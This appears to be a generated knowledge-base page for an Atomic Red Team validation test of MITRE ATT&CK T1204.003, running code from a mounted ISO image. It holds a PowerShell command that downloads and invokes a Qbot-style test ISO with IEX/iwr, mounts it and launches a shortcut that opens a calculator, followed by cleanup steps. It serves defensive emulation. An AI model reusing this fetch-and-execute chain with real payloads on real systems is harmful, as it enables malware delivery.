---
atomic_guid: "e9795c8d-42aa-4ed4-ad80-551ed793d006"
title: "Malicious Execution from Mounted ISO Image"
framework: "atomic"
generated: "true"
attack_technique_id: "T1204.003"
attack_technique_name: "User Execution: Malicious Image"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1204.003/T1204.003.yaml"
build_date: "2026-04-26 17:02:12"
executor: "powershell"
aliases:
  - "e9795c8d-42aa-4ed4-ad80-551ed793d006"
  - "Malicious Execution from Mounted ISO Image"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# Malicious Execution from Mounted ISO Image

Adversaries may rely on a user running a malicious image to facilitate execution

## Metadata

- Atomic GUID: e9795c8d-42aa-4ed4-ad80-551ed793d006
- Technique: T1204.003: User Execution: Malicious Image
- Platforms: windows
- Executor: powershell
- Elevation Required: True
- Source Path: atomics/T1204.003/T1204.003.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1204-user_execution|T1204.003]]

## Executor

- elevation_required: True
- name: powershell

### Command

```powershell
IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.003/src/qbot-test.iso" -OutFile "$env:TEMP\qbot-test.iso")
Mount-DiskImage -ImagePath "$env:TEMP\qbot-test.iso"
$mountedpath = (Get-DiskImage -ImagePath "$env:TEMP\qbot-test.iso" | Get-Volume).DriveLetter
$finalpath = $mountedpath + ":\"
cd $finalpath
.\calc.exe.lnk
```

### Cleanup

```powershell
start-sleep -s 5
stop-process -Name "Calculatorapp" -Force 
dismount-diskimage -ImagePath "$env:TEMP\qbot-test.iso"
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1204.003/T1204.003.yaml)
